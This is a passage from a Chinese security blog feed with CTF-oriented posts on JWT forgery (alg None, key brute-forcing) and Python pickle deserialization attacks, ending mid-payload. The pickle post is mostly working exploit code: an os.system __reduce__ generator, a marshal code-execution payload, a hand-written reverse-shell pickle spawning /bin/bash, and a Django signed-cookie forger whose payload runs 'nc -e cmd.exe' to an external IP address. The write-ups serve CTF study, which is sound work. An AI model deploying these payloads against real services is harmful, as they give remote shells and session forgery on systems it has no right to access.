        <content type="html"><![CDATA[<h1 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p> <a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">https://xz.aliyun.com/t/6776</a></p><p>  <a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a> </p><h2 id="关于jwt"><a href="#关于jwt" class="headerlink" title="关于jwt"></a>关于jwt</h2><p>JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p><p>jwt由三个部分组成：<code>header</code>.<code>payload</code>.<code>signature</code></p><h3 id="header部分"><a href="#header部分" class="headerlink" title="header部分"></a>header部分</h3><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<em>HMAC</em>和<em>RSA</em>算法），typ`声明类型为JWT</p><p>header通常会长这个样子：</p><pre><code>{        &quot;alg&quot; : &quot;HS256&quot;,        &quot;typ&quot; : &quot;jwt&quot;}</code></pre><h3 id="payload部分"><a href="#payload部分" class="headerlink" title="payload部分"></a>payload部分</h3><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据</p><pre><code>{        &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者    &quot;iat&quot;: 1573440582,        //签发时间    &quot;exp&quot;: 1573940267,        //过期时间    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识}</code></pre><h3 id="signature部分"><a href="#signature部分" class="headerlink" title="signature部分"></a>signature部分</h3><p>signature的功能是保护token完整性。</p><p>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。</p><p>抽象成公式就是</p><pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p><h3 id="完整token生成"><a href="#完整token生成" class="headerlink" title="完整token生成"></a>完整token生成</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用base64url编码，signature通过指定算法生成。</p><p>python的<code>Pyjwt</code>使用示例如下</p><pre><code>import jwtencoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>生成的token为</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h4><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p><p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段</p><pre><code>{    &quot;alg&quot; : &quot;None&quot;,    &quot;typ&quot; : &quot;jwt&quot;}{    &quot;user&quot; : &quot;Admin&quot;}</code></pre><p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p><p>(header+’.’+payload，去掉了’.’+signature字段)</p><p>空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p><h4 id="修改RSA加密算法为HMAC"><a href="#修改RSA加密算法为HMAC" class="headerlink" title="修改RSA加密算法为HMAC"></a>修改RSA加密算法为HMAC</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>工具 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/12/19/jwt攻击方式/">https://www.ccreater.top/2019/12/19/jwt攻击方式/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python  pickle 入门</title>
      <link href="2019/12/16/pickle/"/>
      <url>2019/12/16/pickle/</url>
      
        <content type="html"><![CDATA[<h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p>z牛: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p><pre><code class="python">MARK           = b&#39;(&#39;   # push special markobject on stackSTOP           = b&#39;.&#39;   # every pickle ends with STOPPOP            = b&#39;0&#39;   # discard topmost stack itemPOP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobjectDUP            = b&#39;2&#39;   # duplicate top stack itemFLOAT          = b&#39;F&#39;   # push float object; decimal string argumentINT            = b&#39;I&#39;   # push integer or bool; decimal string argumentBININT         = b&#39;J&#39;   # push four-byte signed intBININT1        = b&#39;K&#39;   # push 1-byte unsigned intLONG           = b&#39;L&#39;   # push long; decimal string argumentBININT2        = b&#39;M&#39;   # push 2-byte unsigned intNONE           = b&#39;N&#39;   # push NonePERSID         = b&#39;P&#39;   # push persistent object; id is taken from string argBINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stackSTRING         = b&#39;S&#39;   # push string; NL-terminated string argumentBINSTRING      = b&#39;T&#39;   # push string; counted binary string argumentSHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#39;a&#39;   # append stack top to list below itBUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string argsDICT           = b&#39;d&#39;   # build a dict from stack itemsEMPTY_DICT     = b&#39;}&#39;   # push empty dictAPPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack sliceGET            = b&#39;g&#39;   # push item from memo on stack; index is string argBINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#39;i&#39;   # build &amp; push class instanceLONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte argLIST           = b&#39;l&#39;   # build list from topmost stack itemsEMPTY_LIST     = b&#39;]&#39;   # push empty listOBJ            = b&#39;o&#39;   # build &amp; push class instancePUT            = b&#39;p&#39;   # store stack top in memo; index is string argBINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#39;s&#39;   # add key+value pair to dictTUPLE          = b&#39;t&#39;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#39;)&#39;   # push empty tupleSETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encodingTRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre><h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p><ol><li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li><li>写入对象类名</li><li>写入第一步生成的键值对</li></ol><h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol><li>获取pickle流</li><li>重新构建属性列表</li><li>根据保存的类名来创建对象</li><li>将属性列表恢复到对象中</li></ol><h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol><li>指令解释器<br>最后一步一定是返回栈顶元素</li><li>栈 </li><li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li></ol><h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol><li><p>pvm的操作码只有一个字节</p></li><li><p>需要参数的操作码,要在每一个参数后面加上换行符</p></li><li><p>从pickle流中读取数据,并加载到栈上</p></li></ol><h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table><thead><tr><th>操作码</th><th>助记</th><th>加载到栈上的数据类型</th><th>示例</th></tr></thead><tbody><tr><td>S</td><td>string</td><td>String</td><td>S’foo’\n</td></tr><tr><td>V</td><td>unicode</td><td>unicode</td><td>Vfo\u006f\n</td></tr><tr><td>I</td><td>int</td><td>int</td><td>I42\n</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>(</td><td>MARK</td><td>向栈中加入一个标记</td><td>(</td></tr><tr><td>0</td><td>POP</td><td>弹出栈顶元素并丢弃</td><td>0</td></tr><tr><td>p<code>&lt;memo_index&gt;</code>\n</td><td>PUT</td><td>复制栈顶元素到memo中</td><td>p101\n</td></tr><tr><td>g<code>&lt;memo_index&gt;</code>\n</td><td>GET</td><td>将memo中指定元素拷贝到栈顶</td><td>g101\n</td></tr></tbody></table><h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>l</td><td>列表</td><td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td><td>(S’string’\nl</td></tr><tr><td>t</td><td>元组</td><td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td><td>(S’string’\nS’string2’\nt</td></tr><tr><td>d</td><td>字典</td><td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td><td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td></tr><tr><td>s</td><td>SETITEM</td><td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td><td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul><li><p>生成元组的指令</p><pre><code>(S&#39;str1&#39;S&#39;str2&#39;I1234t</code></pre></li><li><p>生成元组的过程图</p></li></ul><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p><h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>c</td><td>GLOBAL</td><td>需要两个参数(module,class)来创建对象,并将其放到栈中</td><td>cos\nsystem\n</td></tr><tr><td>R</td><td>REDUCE</td><td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td><td>cos\nsystem\n(S’sleep 10’\ntR</td></tr></tbody></table><h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p><h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p><pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) f.read()</code></pre><p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p><p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p><p>最后合成的pickle是</p><pre><code>#step1c__builtin__open(S&#39;/path/to/massive/sikrit&#39;tRp100#step2c__builtin__apply(c__builtin__getattr(c__builtin__fileS&#39;read&#39;tR(g100ltR.</code></pre><h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p><h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p><blockquote><p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p></blockquote><pre><code class="python">import os, pickleclass Test(object):    def __reduce__(self):        return (os.system,(&#39;ls&#39;,))print(pickle.dumps(Test(), protocol=0))</code></pre><h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><pre><code class="python"># !/usr/bin/env python# -*- coding:utf-8 -*-__author__ = &#39;bit4&#39;__github__ = &#39;https://github.com/bit4woo&#39;import marshalimport base64import cPickleimport urllibimport pickledef foo():#you should write your code in this function    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;dir&#39;)code_serialized = base64.b64encode(marshal.dumps(foo.func_code))#为了保证code_serialized中的内容得到执行，我们需要如下代码#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()payload =  &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))print(payload)</code></pre><h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p><p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p><p><code>dispatch[BININT1[0]] = load_binint1</code></p><p>找到类似这种的后面的就是对应的函数</p><h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">converttopickle.py</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre><p>localhost:55555</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>使用v0版的pickle协议,保证shellcode的通用性</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">题目链接</a></p><p>考点:pickle</p><p>代码审计一波后</p><p>如果猜对10次后会给flag(机会只有10次)</p><p>因为知道是考pickle直接全局搜索pickle发现在server处有</p><p><code>ticket = restricted_loads(ticket)</code></p><p>其中ticket是我们可控点</p><p>跟进去看</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:            return getattr(sys.modules[module], name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p><p>在这一题中拿到flag有两种方式:</p><ol><li>命令执行</li><li>通过游戏</li></ol><p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p><p>而游戏中判定赢的条件是</p><pre><code class="python">class Game    def is_win(self):        return self.win_count == max_round</code></pre><p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p><p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p><p>那么接下来就是如何修改了</p><p>在pickle的操作码中我们发现</p><p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p><p>其中update()就可以修改game的属性了</p><p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p><p>一路跟踪发现b操作码的实现</p><pre><code class="python">    def load_build(self):        stack = self.stack        state = stack.pop()        inst = stack[-1]        setstate = getattr(inst, &quot;__setstate__&quot;, None)        if setstate is not None:            setstate(state)            return        slotstate = None        if isinstance(state, tuple) and len(state) == 2:            state, slotstate = state        if state:            inst_dict = inst.__dict__            intern = sys.intern            for k, v in state.items():                if type(k) is str:                    inst_dict[intern(k)] = v                else:                    inst_dict[k] = v        if slotstate:            for k, v in slotstate.items():                setattr(inst, k, v)</code></pre><p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p><p>最后的payload:</p><pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre><h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">题目链接</a></p><p>代码审计发现在index处可以ssti</p><pre><code class="python">def index(request):    django_engine = engines[&#39;django&#39;]    template = django_engine.from_string(&#39;My name is &#39; + request.user.username)    return HttpResponse(template.render(None, request))</code></pre><p>但是django难以利用ssti命令执行但是能读取敏感配置</p><p>结合serializer.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in self.blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))class PickleSerializer():    def dumps(self, obj):        return pickle.dumps(obj)    def loads(self, data):        try:            if isinstance(data, str):                raise TypeError(&quot;Can&#39;t load pickle from unicode string&quot;)            file = io.BytesIO(data)            return RestrictedUnpickler(file,                              encoding=&#39;ASCII&#39;, errors=&#39;strict&#39;).load()        except Exception as e:            return {}</code></pre><p>和setting文件里的特殊配置</p><pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></pre><p>查阅django文档发现</p><p> <a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p><p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p><p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p><p>在理解之后便有一下生成恶意cookie的代码</p><pre><code class="python">import base64import datetimeimport jsonimport reimport timeimport zlibimport picklefrom django.utils import baseconvfrom django.utils.crypto import constant_time_compare, salted_hmacfrom django.utils.encoding import force_bytesfrom django.utils.module_loading import import_stringfrom django import corefrom django.core import signingmyexp=b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;def pickle_exp(SECRET_KEY):    data = myexp    compress=True    # Flag for if it&#39;s been compressed or not    is_compressed = False    salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;    if compress:        # Avoid zlib dependency unless compress is being used        compressed = zlib.compress(data)        if len(compressed) &lt; (len(data) - 1):            data = compressed            is_compressed = True    base64d = signing.b64_encode(data).decode()    if is_compressed:        base64d = &#39;.&#39; + base64d    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))pickle_exp(&quot;asdasdasdasdas&quot;)</code></pre><p>接下来就是如何构造恶意的pickle代码的问题了</p><p>题目限制了只能加载builtins里的属性</p><p>且属性名不能为以下内容</p><pre><code>blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code></pre><p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p><p>我们现在把目光聚焦在如何构造利用链上</p><p>builtins的属性(删除部分)</p><pre><code class="python">[&#39;_&#39;, &#39;__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;all&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]</code></pre><p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p><p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p><p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p><p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p><p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p><p>其对应的pickle代码是</p><pre><code class="python">b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 